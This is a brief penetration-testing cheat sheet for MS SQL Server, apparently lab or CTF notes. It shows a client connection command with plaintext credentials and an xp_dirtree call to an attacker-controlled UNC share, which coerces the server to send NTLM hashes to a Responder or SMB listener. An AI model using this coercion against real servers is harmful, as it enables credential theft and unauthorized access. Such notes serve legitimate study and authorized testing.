# Ms-sql

## connect

```bash
mssqlclient.py admin:this_is_password@10.10.10.52 -db orcharddb -dc-ip 10.10.10.52
```

## Getting Hash by xp_dirtree

```
xp_dirtree \\192.168.1.210\shared
```

while listening on the other side with smb server or responder.
